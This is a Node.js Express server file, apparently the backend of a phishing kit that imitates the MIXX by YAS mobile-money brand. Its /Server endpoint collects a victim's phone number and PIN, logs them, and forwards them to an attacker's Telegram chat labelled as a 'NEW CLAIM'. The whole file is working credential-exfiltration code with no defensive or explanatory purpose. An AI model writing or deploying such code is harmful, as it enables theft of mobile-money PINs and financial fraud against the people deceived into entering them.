require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Log token status
console.log('========================================');
console.log('🚀 MIXX_BY YAS Backend Server');
console.log('========================================');
console.log(`📱 Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}`);
console.log(`🔗 Bot Token Preview: ${TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'None'}`);
console.log('========================================');

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(express.json());

app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'MIXX_BY YAS Backend running',
    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️'
  });
});

app.post('/Server', async (req, res) => {
  try {
    const { phone, pin } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ 
        success: false, 
        message: 'Phone and PIN required' 
      });
    }

    console.log('✅ Valid data received:', { phone, pin });

    // ============================================
    // SEND TO TELEGRAM
    // ============================================
    let telegramSuccess = false;
    let errorDetails = null;

    try {
      // First, test if the bot is valid
      const botCheck = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
      console.log('🤖 Bot check:', botCheck.data.ok ? '✅ Valid' : '❌ Invalid');

      if (!botCheck.data.ok) {
        throw new Error('Invalid bot token');
      }

      // Send message
      const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}`;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const response = await axios.post(telegramUrl, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      telegramSuccess = response.data.ok;
      
      if (telegramSuccess) {
        console.log('✅ Telegram notification sent successfully!');
      } else {
        console.error('❌ Telegram returned error:', response.data);
        errorDetails = response.data;
      }
    } catch (error) {
      console.error('❌ Telegram send failed:');
      console.error('  Message:', error.message);
      
      if (error.response) {
        console.error('  Status:', error.response.status);
        console.error('  Data:', JSON.stringify(error.response.data, null, 2));
        errorDetails = error.response.data;
      }
      
      telegramSuccess = false;
    }

    // ============================================
    // RESPONSE
    // ============================================
    res.json({
      success: true,
      telegram: { 
        sent: telegramSuccess,
        error: errorDetails
      },
      data: { phone, pin: '****' }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error',
      error: error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`📡 Server running on port ${PORT}`);
});
